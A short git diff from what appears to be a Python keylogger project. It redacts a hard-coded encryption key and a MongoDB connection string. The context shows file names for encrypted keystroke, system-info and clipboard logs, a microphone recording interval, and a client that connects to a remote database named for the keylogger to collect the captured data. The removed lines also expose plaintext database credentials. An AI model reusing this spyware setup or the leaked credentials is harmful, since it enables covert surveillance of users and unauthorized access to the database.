@@ -48,7 +48,7 @@ key_info_e = "key_log_encrypted.txt"
 system_info_e = "sys_info_encrypted.txt"   
 clipboard_info_e = "clipboard_encrypted.txt"
 
-key = "7-2oBjGOW2nwL573jvPWQ9w9bcaVR6UA5BZlBqHWX0Q="
+key = "7-2oBjGOW2nwL573jv********aVR6UA5BZlBqHWX0Q="
 
 microphone_time = 15
 time_iteration = 20
@@ -189,7 +189,7 @@ time.sleep(120)
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 
-uri = "mongodb+srv://keyloggerproj67:p3fogkOgOedIDFIA@keylogger1.wvs2pa8.mongodb.net/?retryWrites=true&w=majority&appName=Keylogger1"
+uri = "mongodb+srv://***************:****************@keylogger1.wvs2pa8.mongodb.net/?retryWrites=true&w=majority&appName=Keylogger1"
 
 # Create a new client and connect to the server
 client = MongoClient(uri, server_api=ServerApi('1'))
